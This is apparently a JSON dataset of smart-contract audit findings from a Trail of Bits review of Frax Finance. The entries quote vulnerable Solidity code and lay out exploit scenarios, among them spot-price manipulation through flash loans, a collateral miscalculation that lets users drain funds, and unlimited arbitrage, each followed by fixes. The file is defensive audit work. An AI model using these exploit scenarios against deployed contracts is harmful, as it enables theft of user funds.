2 find test -type f | wc -l",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "3. amoMinterBorrow cannot be paused ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "description": "The amoMinterBorrow function does not check for any of the paused ags or whether the minters associated collateral type is enabled. This reduces the FraxPoolV3 custodians ability to limit the scope of an attack. The relevant code appears in gure 3.1. The custodian can set recollateralizePaused[minter_col_idx] to true if there is a problem with recollateralization, and collateralEnabled[minter_col_idx] to false if there is a problem with the specic collateral type. However, amoMinterBorrow checks for neither of these. // Bypasses the gassy mint->redeem cycle for AMOs to borrow collateral function amoMinterBorrow ( uint256 collateral_amount ) external onlyAMOMinters { // Checks the col_idx of the minter as an additional safety check uint256 minter_col_idx = IFraxAMOMinter ( msg.sender ). col_idx (); // Transfer TransferHelper. safeTransfer (collateral_addresses[minter_col_idx], msg.sender , collateral_amount); } Figure 3.1: contracts/Frax/Pools/FraxPoolV3.sol#L552-L559 Exploit Scenario Eve discovers and exploits a bug in an AMO contract. The FraxPoolV3 custodian discovers the attack but is unable to stop it. The FraxPoolV3 owner is required to disable the AMO contracts. This occurs after signicant funds have been lost. Recommendations Short term, require recollateralizePaused[minter_col_idx] to be false and collateralEnabled[minter_col_idx] to be true for a call to amoMinterBorrow to succeed. This will help the FraxPoolV3 custodian to limit the scope of an attack. Long term, regularly review all uses of contract modiers, such as collateralEnabled . Doing so will help to expose bugs like the one described here.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Array updates are not constant time ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "description": "In several places, arrays are allowed to grow without bound, and those arrays are searched linearly. If an array grows too large and the block gas limit is too low, such a search would fail. An example appears in gure 4.1. Minters are pushed to but never popped from minters_array . When a minter is removed from the array, its entry is searched for and then set to 0 . Note that the cost of such a search is proportional to the searched-for entrys index within the array. Thus, there will eventually be entries that cannot be removed under the current block gas limits because their positions within the array are too large. function removeMinter ( address minter_address ) external onlyByOwnGov { require (minter_address != address ( 0 ), \"Zero address detected\" ); require (minters[minter_address] == true , \"Address nonexistant\" ); // Delete from the mapping delete minters[minter_address]; // 'Delete' from the array by setting the address to 0x0 for ( uint i = 0 ; i < minters_array.length; i++){ if (minters_array[i] == minter_address) { minters_array[i] = address ( 0 ); // This will leave a null in the array and keep the indices the same break ; } } emit MinterRemoved (minter_address); } Figure 4.1: contracts/ERC20/__CROSSCHAIN/CrossChainCanonical.sol#L269-L285 Note that occasionally popping values from minters_array is not sucient to address the issue. An array can be popped from occasionally, yet its size can still be unbounded. A similar problem exists in CrossChainCanonical.sol with respect to bridge_tokens_array . This problem appears to exist in many parts of the codebase. Exploit Scenario Eve tricks Frax Finance into adding her minter to the CrosschainCanonical contract. Frax Finance later decides to remove her minter, but is unable to do so because minters_array has grown too large and block gas limits are too low. Recommendations Short term, enforce the following policy throughout the codebase: an arrays size is bounded, or the array is linearly searched, but never both. Arrays that grow without bound can be updated by moving computations, such as the computation of the index that needs to be updated, o-chain. Alternatively, the code that uses the array could be adjusted to eliminate the need for the array or to instead use a linked list. Adopting these changes will help ensure that the success of critical operations is not dependent on block gas limits. Long term, incorporate a check for this problematic code pattern into the CI pipeline. In the medium term, such a check might simply involve regular expressions. In the longer term, use Semgrep for Solidity if or when such support becomes stable. This will help to ensure the problem is not reintroduced into the codebase.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "5. Incorrect calculation of collateral amount in redeemFrax ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "description": "The redeemFrax function of the FraxPoolV3 contract multiplies a FRAX amount with the collateral price to calculate the equivalent collateral amount (see the highlights in gure 5.1). This is incorrect. The FRAX amount should be divided by the collateral price instead. Fortunately, in the current deployment of FraxPoolV3 , only stablecoins are used as collateral, and their price is set to 1 (also see issue TOB-FRSOL-009 ). This mitigates the issue, as multiplication and division by one are equivalent. If the collateral price were changed to a value dierent from 1 , the exploit scenario described below would become possible, enabling users to steal all collateral from the protocol. if (global_collateral_ratio >= PRICE_PRECISION) { // 1-to-1 or overcollateralized collat_out = frax_after_fee .mul(collateral_prices[col_idx]) .div( 10 ** ( 6 + missing_decimals[col_idx])); // PRICE_PRECISION + missing decimals fxs_out = 0 ; } else if (global_collateral_ratio == 0 ) { // Algorithmic fxs_out = frax_after_fee .mul(PRICE_PRECISION) .div(getFXSPrice()); collat_out = 0 ; } else { // Fractional collat_out = frax_after_fee .mul(global_collateral_ratio) .mul(collateral_prices[col_idx]) .div( 10 ** ( 12 + missing_decimals[col_idx])); // PRICE_PRECISION ^2 + missing decimals fxs_out = frax_after_fee .mul(PRICE_PRECISION.sub(global_collateral_ratio)) .div(getFXSPrice()); // PRICE_PRECISIONS CANCEL OUT } Figure 5.1: Part of the redeemFrax function ( FraxPoolV3.sol#412433 ) When considering the    of an entity  , it is common to think of it as the amount of another entity  or  s per  . that has a value equivalent to 1  . The unit of measurement of    is   , For example, the price of one apple is the number of units of another entity that can be exchanged for one unit of apple. That other entity is usually the local currency. For the US, the price of an apple is the number of US dollars that can be exchanged for an apple:   = $  .  1. Given a    and an amount of    , one can compute the equivalent     through multiplication:    =     .    2. Given a    and an amount of    , one can compute the equivalent     through division: =       /   .  In short, multiply if the known amount and price refer to the same entity; otherwise, divide. The getFraxInCollateral function correctly follows rule 2 by dividing a FRAX amount by the collateral price to get the equivalent collateral amount (gure 5.2). function getFRAXInCollateral ( uint256 col_idx , uint256 frax_amount ) public view returns ( uint256 ) { return frax_amount.mul(PRICE_PRECISION).div( 10 ** missing_decimals[col_idx]). div(collateral_prices[col_idx]) ; } Figure 5.2: The getFraxInCollateral function ( FraxPoolV3.sol#242244 ) Exploit Scenario A collateral price takes on a value other than 1 . This can happen through either a call to setCollateralPrice or future modications that fetch the price from an oracle (also see issue TOB-FRSOL-009 ). A collateral asset is worth $1,000. Alice mints 1,000 FRAX for 1 unit of collateral. Alice then redeems 1,000 FRAX for 1 million units of collateral ( ). As a result, Alice has stolen around $1 billion from the protocol. If the calculation were 1000 / 1000 correct, Alice would have redeemed her 1,000 FRAX for 1 unit of collateral ( 1000  1000 ). Recommendations Short term, in FraxPoolV3.redeemFrax , use the existing getFraxInCollateral helper function (gure 5.2) to compute the collateral amount that is equivalent to a given FRAX amount. Long term, verify that all calculations involving prices use the above rules 1 and 2 correctly.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. spotPriceOHM is vulnerable to manipulation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "description": "The OHM_AMO contract uses the Uniswap V2 spot price to calculate the value of the collateral that it holds. This price can be manipulated by making a large trade through the OHM-FRAX pool. An attacker can manipulate the apparent value of collateral and thereby change the collateralization rate at will. FraxPoolV3 appears to contain the most funds at risk, but any contract that uses FRAX.globalCollateralValue is susceptible to a similar attack. (It looks like Pool_USDC has buybacks paused, so it should not be able to burn FXS, at the time of writing.) function spotPriceOHM () public view returns ( uint256 frax_per_ohm_raw , uint256 frax_per_ohm ) { ( uint256 reserve0 , uint256 reserve1 , ) = (UNI_OHM_FRAX_PAIR.getReserves()); // OHM = token0, FRAX = token1 frax_per_ohm_raw = reserve1.div(reserve0); frax_per_ohm = reserve1.mul(PRICE_PRECISION).div(reserve0.mul( 10 ** missing_decimals_ohm)); } Figure 6.1: old_contracts/Misc_AMOs/OHM_AMO.sol#L174-L180 FRAX.globalCollateralValue loops through frax_pools_array , including OHM_AMO , and aggregates collatDollarBalance . The collatDollarBalance for OHM_AMO is calculated using spotPriceOHM and thus is vulnerable to manipulation. function globalCollateralValue() public view returns ( uint256 ) { uint256 total_collateral_value_d18 = 0 ; for ( uint i = 0 ; i < frax_pools_array.length; i++){ // Exclude null addresses if (frax_pools_array[i] != address ( 0 )){ total_collateral_value_d18 = total_collateral_value_d18.add(FraxPool(frax_pools_array[i]).collatDollarBalance()); } } return total_collateral_value_d18; } Figure 6.2: contracts/Frax/Frax.sol#L180-L191 buyBackAvailableCollat returns the amount the protocol will buy back if the aggregate value of collateral appears to back each unit of FRAX with more than is required by the current collateral ratio. Since globalCollateralValue is manipulable, the protocol can be articially forced into buying (burning) FXS shares and paying out collateral. function buybackAvailableCollat () public view returns ( uint256 ) { uint256 total_supply = FRAX.totalSupply(); uint256 global_collateral_ratio = FRAX.global_collateral_ratio(); uint256 global_collat_value = FRAX.globalCollateralValue(); if (global_collateral_ratio > PRICE_PRECISION) global_collateral_ratio = PRICE_PRECISION; // Handles an overcollateralized contract with CR > 1 uint256 required_collat_dollar_value_d18 = (total_supply.mul(global_collateral_ratio)).div(PRICE_PRECISION); // Calculates collateral needed to back each 1 FRAX with $1 of collateral at current collat ratio if (global_collat_value > required_collat_dollar_value_d18) { // Get the theoretical buyback amount uint256 theoretical_bbk_amt = global_collat_value.sub(required_collat_dollar_value_d18); // See how much has collateral has been issued this hour uint256 current_hr_bbk = bbkHourlyCum[curEpochHr()]; // Account for the throttling return comboCalcBbkRct(current_hr_bbk, bbkMaxColE18OutPerHour, theoretical_bbk_amt); } else return 0 ; } Figure 6.3: contracts/Frax/Pools/FraxPoolV3.sol#L284-L303 buyBackFXS calculates the amount of FXS to burn from the user, calls b urn on the FRAXShares contract, and sends the caller an equivalent dollar amount in USDC. function buyBackFxs ( uint256 col_idx , uint256 fxs_amount , uint256 col_out_min ) external collateralEnabled(col_idx) returns ( uint256 col_out ) { require (buyBackPaused[col_idx] == false , \"Buyback is paused\" ); uint256 fxs_price = getFXSPrice(); uint256 available_excess_collat_dv = buybackAvailableCollat(); // If the total collateral value is higher than the amount required at the current collateral ratio then buy back up to the possible FXS with the desired collateral require (available_excess_collat_dv > 0 , \"Insuf Collat Avail For BBK\" ); // Make sure not to take more than is available uint256 fxs_dollar_value_d18 = fxs_amount.mul(fxs_price).div(PRICE_PRECISION); require (fxs_dollar_value_d18 <= available_excess_collat_dv, \"Insuf Collat Avail For BBK\" ); // Get the equivalent amount of collateral based on the market value of FXS provided uint256 collateral_equivalent_d18 = fxs_dollar_value_d18.mul(PRICE_PRECISION).div(collateral_prices[col_idx]); col_out = collateral_equivalent_d18.div( 10 ** missing_decimals[col_idx]); // In its natural decimals() // Subtract the buyback fee col_out = (col_out.mul(PRICE_PRECISION.sub(buyback_fee[col_idx]))).div(PRICE_PRECISION); // Check for slippage require (col_out >= col_out_min, \"Collateral slippage\" ); // Take in and burn the FXS, then send out the collateral FXS.pool_burn_from( msg.sender , fxs_amount); TransferHelper.safeTransfer(collateral_addresses[col_idx], msg.sender , col_out); // Increment the outbound collateral, in E18, for that hour // Used for buyback throttling bbkHourlyCum[curEpochHr()] += collateral_equivalent_d18; } Figure 6.4: contracts/Frax/Pools/FraxPoolV3.sol#L488-L517 recollateralize takes collateral from a user and gives the user an equivalent amount of FXS, including a bonus. Currently, the bonus_rate is set to 0 , but a nonzero bonus_rate would signicantly increase the protability of an attack. // When the protocol is recollateralizing, we need to give a discount of FXS to hit the new CR target // Thus, if the target collateral ratio is higher than the actual value of collateral, minters get FXS for adding collateral // This function simply rewards anyone that sends collateral to a pool with the same amount of FXS + the bonus rate // Anyone can call this function to recollateralize the protocol and take the extra FXS value from the bonus rate as an arb opportunity function recollateralize( uint256 col_idx, uint256 collateral_amount, uint256 fxs_out_min) external collateralEnabled(col_idx) returns ( uint256 fxs_out) { require (recollateralizePaused[col_idx] == false , \"Recollat is paused\" ); uint256 collateral_amount_d18 = collateral_amount * ( 10 ** missing_decimals[col_idx]); uint256 fxs_price = getFXSPrice(); // Get the amount of FXS actually available (accounts for throttling) uint256 fxs_actually_available = recollatAvailableFxs(); // Calculated the attempted amount of FXS fxs_out = collateral_amount_d18.mul(PRICE_PRECISION.add(bonus_rate).sub(recollat_fee[col_idx]) ).div(fxs_price); // Make sure there is FXS available require (fxs_out <= fxs_actually_available, \"Insuf FXS Avail For RCT\" ); // Check slippage require (fxs_out >= fxs_out_min, \"FXS slippage\" ); // Don't take in more collateral than the pool ceiling for this token allows require (freeCollatBalance(col_idx).add(collateral_amount) <= pool_ceilings[col_idx], \"Pool ceiling\" ); // Take in the collateral and pay out the FXS TransferHelper.safeTransferFrom(collateral_addresses[col_idx], msg.sender , address ( this ), collateral_amount); FXS.pool_mint( msg.sender , fxs_out); // Increment the outbound FXS, in E18 // Used for recollat throttling rctHourlyCum[curEpochHr()] += fxs_out ; } Figure 6.5: contracts/Frax/Pools/FraxPoolV3.sol#L519-L550 Exploit Scenario FraxPoolV3.bonus_rate is nonzero. Using a ash loan, an attacker buys OHM with FRAX, drastically increasing the spot price of OHM. When FraxPoolV3.buyBackFXS is called, the protocol incorrectly determines that FRAX has gained additional collateral. This causes the pool to burn FXS shares and to send the attacker USDC of the equivalent dollar value. The attacker moves the price in the opposite direction and calls recollateralize on the pool, receiving and selling newly minted FXS, including a bonus, for prot. This attack can be carried out until the buyback and recollateralize hourly cap, currently 200,000 units, is reached. Recommendations Short term, take one of the following steps to mitigate this issue:   Call FRAX.removePool and remove OHM_AMO . Note, this may cause the protocol to become less collateralized. Call FraxPoolV3.setBbkRctPerHour and set bbkMaxColE18OutPerHour and rctMaxFxsOutPerHour to 0 . Calling toggleMRBR to pause USDC buybacks and recollateralizations would have the same eect. The implications of this mitigation on the long-term sustainability of the protocol are not clear. Long term, do not use the spot price to determine collateral value. Instead, use a time-weighted average price (TWAP) or an oracle such as Chainlink. If a TWAP is used, ensure that the underlying pool is highly liquid and not easily manipulated. Additionally, create a rigorous process to onboard collateral since an exploit of this nature could destabilize the system. References  samczsun, \"So you want to use a price oracle\"  euler-xyz/uni-v3-twap-manipulation",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Return values of the Chainlink oracle are not validated ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "description": "The latestRoundData function returns a signed integer that is coerced to an unsigned integer without checking that the value is a positive integer. An overow (e.g., uint(-1) ) would drastically misrepresent the price and cause unexpected behavior. In addition, FraxPoolV3 does not validate the completion and recency of the round data, permitting stale price data that does not reect recent changes. function getFRAXPrice() public view returns ( uint256 ) { ( , int price, , , ) = priceFeedFRAXUSD.latestRoundData(); return uint256 (price).mul(PRICE_PRECISION).div( 10 ** chainlink_frax_usd_decimals); } function getFXSPrice() public view returns ( uint256 ) { ( , int price, , , ) = priceFeedFXSUSD.latestRoundData(); return uint256 (price).mul(PRICE_PRECISION).div( 10 ** chainlink_fxs_usd_decimals); } Figure 7.1: contracts/Frax/Pools/FraxPoolV3.sol#231239 An older version of Chainlinks oracle interface has a similar function, latestAnswer . When this function is used, the return value should be checked to ensure that it is a positive integer. However, round information does not need to be checked because latestAnswer returns only price data. Recommendations Short term, add a check to latestRoundData and similar functions to verify that values are non-negative before converting them to unsigned integers, and add an invariant that checks that the round has nished and that the price data is from the current round: require(updatedAt != 0 && answeredInRound == roundID) . Long term, dene a minimum update threshold and add the following check: require((block.timestamp - updatedAt <= minThreshold) && (answeredInRound == roundID)) . Furthermore, use consistent interfaces instead of mixing dierent versions. References  Chainlink AggregatorV3Interface",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "8. Unlimited arbitrage in CCFrax1to1AMM ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "description": "The CCFrax1to1AMM contract implements an automated market maker (AMM) with a constant price and zero slippage. It is a constant sum AMM that maintains the invariant  =  +  , where the token balances. must remain constant during swaps (ignoring fees) and and    are Constant sum AMMs are impractical because they are vulnerable to unlimited arbitrage. If the price dierence of the AMMs tokens in external markets is large enough, the most protable arbitrage strategy is to buy the total reserve of the more expensive token from the AMM, leaving the AMM entirely imbalanced. Other AMMs like Uniswap and Curve prevent unlimited arbitrage by making the price depend on the reserves. This limits prots from arbitrage to a fraction of the total reserves, as the price will eventually reach a point at which the arbitrage opportunity disappears. No such limit exists in the CCFrax1to1AMM contract. While arbitrage opportunities are somewhat limited by the token caps, fees, and gas prices, unlimited arbitrage is always possible once the reserves or the dierence between the FRAX price and the token price becomes large enough. While token_price swings are limited by the price_tolerance parameter, frax_price swings are not limited. Exploit Scenario The CCFrax1to1AMM contract is deployed, and price_tolerance is set to 0.05. A token  is whitelisted with a token_cap of 100,000 and a swap_fee of 0.0004. A user transfers 100,000 FRAX to an AMM. The price of minimum at which the AMM allows swaps, and the price of FRAX in an external market becomes 1.005. Alice buys (or takes out a ash loan of) $100,000 worth of market. Alice swaps all of her external market, making a prot of $960. No FRAX remains in the AMM. in the external for FRAX with the AMM and then sells all of her FRAX in the in an external market becomes 0.995, the    This scenario is conservative, as it assumes a balance of only 100,000 FRAX and a frax_price of 1.005. As frax_price and the balance increase, the arbitrage prot increases. Recommendations Short term, do not deploy CCFrax1to1AMM and do not fund any existing deployments with signicant amounts. Those funds will be at risk of being drained through arbitrage. Long term, when providing stablecoin-to-stablecoin liquidity, use a Curve pool or another proven and audited implementation of the stableswap invariant.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "9. Collateral prices are assumed to always be $1 ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "description": "In the FraxPoolV3 contract, the setCollateralPrice function sets collateral prices and stores them in the collateral_prices mapping. As of December 13, 2021, collateral prices are set to $1 for all collateral types in the deployed version of the FraxPoolV3 contract. Currently, only stablecoins are used as collateral within the Frax Protocol. For those stablecoins, $1 is an appropriate price approximation, at most times. However, when the actual price of the collateral diers enough from $1, users could choose to drain value from the protocol through arbitrage. Conversely, during such price uctuations, other users who are not aware that FraxPoolV3 assumes collateral prices are always $1 can receive less value than expected. Collateral tokens that are not pegged to a specic value, like ETH or WBTC, cannot currently be used safely within FraxPoolV3 . Their prices are too volatile, and repeatedly calling setCollateralPrice is not a feasible solution to keeping their prices up to date. Exploit Scenario The price of FEI, one of the stablecoins collateralizing the Frax Protocol, changes to $0.99. Alice, a user, can still mint FRAX/FXS as if the price of FEI were $1. Ignoring fees, Alice can buy 1 million FEI for $990,000, mint 1 million FRAX/FXS with the 1 million FEI, and sell the 1 million FRAX/FXS for $1 million, making $10,000 in the process. As a result, the Frax Protocol loses $10,000. If the price of FEI changes to $1.01, Bob would expect that he can exchange his 1 million FEI for 1.01 million FRAX/FXS. Since FraxPoolV3 is not aware of the actual price of FEI, Bob receives only 1 million FRAX/FXS, incurring a 1% loss. Recommendations Short term, document the arbitrage opportunities described above. Warn users that they could lose funds if collateral prices dier from $1. Disable the option to set collateral prices to values not equal to $1. Long term, modify the FraxPoolV3 contract so that it fetches collateral prices from a price oracle.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "10. Solidity compiler optimizations can be problematic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "description": "Frax Finance has enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed . Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past . A high-severity bug in the emscripten -generated solc -js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6 . More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe . It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizations causes a security vulnerability in the Frax Finance contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "11. Users are unable to limit the amount of collateral paid to FraxPoolV3 ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "description": "The amount of collateral and FXS that is paid by the user in mintFrax is dynamically computed from the collateral ratio and price. These parameters can change between transaction creation and transaction execution. Users currently have no way to ensure that the paid amounts are still within acceptable limits at the time of transaction execution. Exploit Scenario Alice wants to call mintFrax . In the time between when the transaction is broadcast and executed, the global collateral ratio, collateral, and/or FXS prices change in such a way that Alice's minting operation is no longer protable for her. The minting operation is still executed, and Alice loses funds. Recommendations Short term, add the maxCollateralIn and maxFXSIn parameters to mintFrax , enabling users to make the transaction revert if the amount of collateral and FXS that they would have to pay is above acceptable limits. Long term, always add such limits to give users the ability to prevent unacceptably large input amounts and unacceptably small output amounts when those amounts are dynamically computed.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "12. Incorrect default price tolerance in CCFrax1to1AMM ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "description": "The price_tolerance state variable of the CCFrax1to1AMM contract is set to 50,000, which, when using the xed point scaling factor inconsistent with the variables inline comment, which indicates the number 5,000, corresponding to 0.005. A price tolerance of 0.05 is probably too high and can lead to unacceptable arbitrage activities; this suggests that price_tolerance should be set to the value indicated in the code comment. 6 1 0 , corresponds to 0.05. This is uint256 public price_tolerance = 50000 ; // E6. 5000 = .995 to 1.005 Figure 12.1: The price_tolerance state variable ( CCFrax1to1AMM.sol#56 ) Exploit Scenario This issue exacerbates the exploit scenario presented in issue TOB-FRSOL-008 . Given that scenario, but with a price tolerance of 50,000, Alice is able to gain $5459 through arbitrage. A higher price tolerance leads to higher arbitrage prots. Recommendations Short term, set the price tolerance to 5,000 both in the code and on the deployed contract. Long term, ensure that comments are in sync with the code and that constants are correct.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "13. Signicant code duplication ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "description": "Signicant code duplication exists throughout the codebase. Duplicate code can lead to incomplete xes or inconsistent behavior (e.g., because the code is modied in one location but not in all). For example, the FraxUnifiedFarmTemplate.sol and StakingRewardsMultiGauge.sol les both contain a retroCatchUp function. As seen in gure 13.1, the functions are almost identical. // If the period expired, renew it function retroCatchUp () internal { // Pull in rewards from the // If the period expired, renew it function retroCatchUp () internal { // Pull in rewards from the rewards distributor rewards distributor rewards_distributor. distributeReward ( addr ess ( this )); rewards_distributor. distributeReward ( addr ess ( this )); // Ensure the provided reward // Ensure the provided reward amount is not more than the balance in the contract. amount is not more than the balance in the contract. // This keeps the reward rate in // This keeps the reward rate in the right range, preventing overflows due to the right range, preventing overflows due to // very high values of rewardRate // very high values of rewardRate in the earned and rewardsPerToken functions; in the earned and rewardsPerToken functions; // Reward + leftover must be less // Reward + leftover must be less than 2^256 / 10^18 to avoid overflow. than 2^256 / 10^18 to avoid overflow. uint256 num_periods_elapsed = uint256 num_periods_elapsed = uint256 ( block .timestamp - periodFinish) / rewardsDuration; // Floor division to the nearest period uint256 ( block .timestamp. sub (periodFinish) ) / rewardsDuration; // Floor division to the nearest period // Make sure there are enough // Make sure there are enough tokens to renew the reward period tokens to renew the reward period for ( uint256 i = 0 ; i < for ( uint256 i = 0 ; i < rewardTokens.length; i++){ rewardTokens.length; i++){ require (( rewardRates (i) * rewardsDuration * (num_periods_elapsed + 1 )) <= ERC20 (rewardTokens[i]). balanceOf ( address ( this )), string ( abi . encodePacked ( \"Not enough reward tokens available: \" , rewardTokens[i])) ); require ( rewardRates (i). mul (rewardsDuratio n). mul (num_periods_elapsed + 1 ) <= ERC20 (rewardTokens[i]). balanceOf ( address ( this )), string ( abi . encodePacked ( \"Not enough reward tokens available: \" , rewardTokens[i])) ); } } // uint256 old_lastUpdateTime = // uint256 old_lastUpdateTime = lastUpdateTime; lastUpdateTime; // uint256 new_lastUpdateTime = // uint256 new_lastUpdateTime = block.timestamp; block.timestamp; // lastUpdateTime = periodFinish; periodFinish = periodFinish + // lastUpdateTime = periodFinish; periodFinish = ((num_periods_elapsed + 1 ) * rewardsDuration); periodFinish. add ((num_periods_elapsed. add ( 1 )). mul (rewardsDuration)); // Update the rewards and time _updateStoredRewardsAndTime (); _updateStoredRewardsAndTime (); emit // Update the fraxPerLPStored fraxPerLPStored = RewardsPeriodRenewed ( address (stakingToken )); fraxPerLPToken (); } } Figure 13.1: Left: contracts/Staking/FraxUnifiedFarmTemplate.sol#L463-L490 Right: contracts/Staking/StakingRewardsMultiGauge.sol#L637-L662 Exploit Scenario Alice, a Frax Finance developer, is asked to x a bug in the retroCatchUp function. Alice updates one instance of the function, but not both. Eve discovers a copy of the function in which the bug is not xed and exploits the bug. Recommendations Short term, perform a comprehensive code review and identify pieces of code that are semantically similar. Factor out those pieces of code into separate functions where it makes sense to do so. This will reduce the risk that those pieces of code diverge after the code is updated. Long term, adopt code practices that discourage code duplication. Doing so will help to prevent this problem from recurring.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "14. StakingRewardsMultiGauge.recoverERC20 allows token managers to steal rewards ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "description": "The recoverERC20 function in the StakingRewardsMultiGauge contract allows token managers to steal rewards. This violates conventions established by other Frax Solidity contracts in which recoverERC20 can be called only by the contract owner. The relevant code appears in gure 14.1. The recoverERC20 function checks whether the caller is a token manager and, if so, sends him the requested amount of the token he manages. Convention states that this function should be callable only by the contract owner. Moreover, its purpose is typically to recover tokens unrelated to the contract. // Added to support recovering LP Rewards and other mistaken tokens from other systems to be distributed to holders function recoverERC20 ( address tokenAddress , uint256 tokenAmount ) external onlyTknMgrs ( tokenAddress ) { // Check if the desired token is a reward token bool isRewardToken = false ; for ( uint256 i = 0 ; i < rewardTokens.length; i++){ if (rewardTokens[i] == tokenAddress) { isRewardToken = true ; break ; } } // Only the reward managers can take back their reward tokens if (isRewardToken && rewardManagers[tokenAddress] == msg.sender ){ ERC20 (tokenAddress). transfer ( msg.sender , tokenAmount); emit Recovered ( msg.sender , tokenAddress, tokenAmount); return ; } Figure 14.1: contracts/Staking/StakingRewardsMultiGauge.sol#L798-L814 For comparison, consider the CCFrax1to1AMM contracts recoverERC20 function. It is callable only by the contract owner and specically disallows transferring tokens used by the contract. function recoverERC20 ( address tokenAddress , uint256 tokenAmount ) external onlyByOwner { require (!is_swap_token[tokenAddress], \"Cannot withdraw swap tokens\" ); TransferHelper. safeTransfer ( address (tokenAddress), msg.sender , tokenAmount); } Figure 14.2: contracts/Misc_AMOs/__CROSSCHAIN/Moonriver/CCFrax1to1AMM.sol#L340-L344 Exploit Scenario Eve tricks Frax Finance into making her a token manager for the StakingRewardsMultiGauge contract. When the contracts token balance is high, Eve withdraws the tokens and vanishes. Recommendations Short term, eliminate the token managers ability to call recoverERC20 . This will bring recoverERC20 in line with established conventions regarding the functions purpose and usage. Long term, regularly review all uses of contract modiers, such as onlyTknMgrs . Doing so will help to expose bugs like the one described here.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "15. Convex_AMO_V2 custodian can withdraw rewards ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "description": "The Convex_AMO_V2 custodian can withdraw rewards. This violates conventions established by other Frax Solidity contracts in which the custodian is only able to pause operations. The relevant code appears in gure 15.1. The withdrawRewards function is callable by the contract owner, governance, or the custodian. This provides signicantly more power to the custodian than other contracts in the Frax Solidity repository. function withdrawRewards ( uint256 crv_amt , uint256 cvx_amt , uint256 cvxCRV_amt , uint256 fxs_amt ) external onlyByOwnGovCust { if (crv_amt > 0 ) TransferHelper. safeTransfer (crv_address, msg.sender , crv_amt); if (cvx_amt > 0 ) TransferHelper. safeTransfer ( address (cvx), msg.sender , cvx_amt); if (cvxCRV_amt > 0 ) TransferHelper. safeTransfer (cvx_crv_address, msg.sender , cvxCRV_amt); if (fxs_amt > 0 ) TransferHelper. safeTransfer (fxs_address, msg.sender , fxs_amt); } Figure 15.1: contracts/Misc_AMOs/Convex_AMO_V2.sol#L425-L435 Exploit Scenario Eve tricks Frax Finance into making her the custodian for the Convex_AMO_V2 contract. When the unclaimed rewards are high, Eve withdraws them and vanishes. Recommendations Short term, determine whether the Convex_AMO_V2 custodian requires the ability to withdraw rewards. If so, document this as a security concern. This will help users to understand the risks associated with depositing funds into the Convex_AMO_V2 contract. Long term, implement a mechanism that allows rewards to be distributed without requiring the intervention of an intermediary. Reducing human involvement will increase users overall condence in the system.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "16. The FXS1559 documentation is inaccurate ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
